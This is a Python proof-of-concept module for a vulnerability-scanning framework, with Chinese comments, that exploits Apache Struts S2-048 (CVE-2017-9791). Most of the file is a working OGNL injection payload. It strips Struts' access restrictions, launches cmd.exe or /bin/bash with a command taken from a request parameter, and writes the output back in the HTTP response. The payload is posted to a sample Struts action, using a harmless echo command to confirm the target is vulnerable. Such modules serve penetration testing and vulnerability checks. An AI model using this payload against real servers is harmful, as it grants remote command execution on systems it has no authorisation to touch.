import pocs
from lib import config
import re
import requests
import urllib3
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

# 定义类 名称不可改变，且需要继承父类Pocs
class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='structs s2-048 任意命令执行漏洞'
        self.vul_name='structs s2-048 任意命令执行漏洞'
        self.vul_num='CVE-2017-9791'
        self.app_name='structs'
        self.app_version=''
        self.author='haochen'
        self.msg='存在任意命令执行漏洞'
        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        # 自由发挥
        att_msg={}
        # 将攻击的目标和poc名称导入
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        self.must_parameter = must_parameter
        payload1 = "%{"
        payload1 += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload1 += "(#_memberAccess?(#_memberAccess=#dm):"
        payload1 += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload1 += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload1 += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload1 += "(#ognlUtil.getExcludedClasses().clear())."
        payload1 += "(#context.setMemberAccess(#dm))))."
        payload1 += "(#cmd=#parameters.cmd[0])."
        payload1 += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload1 += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload1 += "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
        payload1 += "(#process=#p.start())."
        payload1 += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload1 += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload1 += "(#ros.flush())"
        payload1 += "}"
        head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'}
        self.payload = "/S2-048/integration/saveGangster.action"
        data = {
            "name": payload1,
            "cmd": "echo Affected by S2-048",
            "age": 1,
            "__checkbox_bustedBefore": "true",
            "description": "test"
        }
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        try:
            response = requests.post(target,headers=head,verify=False,data=data)
            # 攻击完成后需要将攻击的结果写入
            if 'Affected by S2-048' == response.text.strip():
                att_msg['status'] = 'success'
                att_msg['msg'] = '存在该漏洞'
            else:
                att_msg['status']='failed'
                att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
                #self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
        except:
            att_msg['status']='error'
            att_msg['msg']='无法正确访问网站'
            #self.set_cout('error','无法正确访问网站！')
        # 返回攻击结果信息
        return att_msg